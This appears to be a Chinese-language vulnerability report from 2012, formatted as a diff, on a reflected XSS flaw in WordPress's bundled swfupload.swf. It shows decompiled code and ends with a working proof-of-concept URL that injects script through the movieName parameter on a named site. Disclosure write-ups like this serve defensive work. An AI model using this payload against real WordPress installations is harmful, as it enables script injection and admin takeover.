@@ -1,0 +1,43 @@
+WordPress反射型XSS 
+
+漏洞详情
+
+披露状态：
+
+
+
+2012-05-18： 积极联系厂商并且等待厂商认领中，细节不对外公开
+2012-05-18： 厂商已经主动忽略漏洞，细节向公众公开
+
+
+简要描述：
+
+WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL 数据库的服务器上架设自己的网志。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。近日，国外安全研究人员公布，WordPress在部分功能实现上采用了不安全的第三方组件，导致XSS漏洞，当攻击者诱骗管理员点击，攻击成功可以直接GETSHELL。
+
+详细说明：
+
+原文：https://nealpoole.com/blog/2012/05/xss-and-csrf-via-swf-applets-swfupload-plupload/
+ 
+对wp-includes/js/swfupload/swfupload.swf进行反编译分析，尽管swfupload.swf其对传入ExternalInterface.call的第二个参数进行了安全编码，但对于函数名，即ExternalInterface.call的第一个参数没有进行安全编码。而函数名中的部分字符可控，造成xss漏洞。
+ 
+this.movieName = root.loaderInfo.parameters.movieName;
+...
+this.flashReady_Callback = "SWFUpload.instances[\"" + this.movieName + "\"].flashReady";
+...
+if (ExternalCall.Bool(this.testExternalInterface_Callback)){
+    ExternalCall.Simple(this.flashReady_Callback);
+    this.hasCalledFlashReady = true;
+}
+
+=================
+class ExternalCall extends Object{
+...
+        public static function Simple(param1:String) : void
+        {
+            ExternalInterface.call(param1);
+            return;
+        }
+
+漏洞证明：
+
+http://www.80sec.com/wp-includes/js/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//
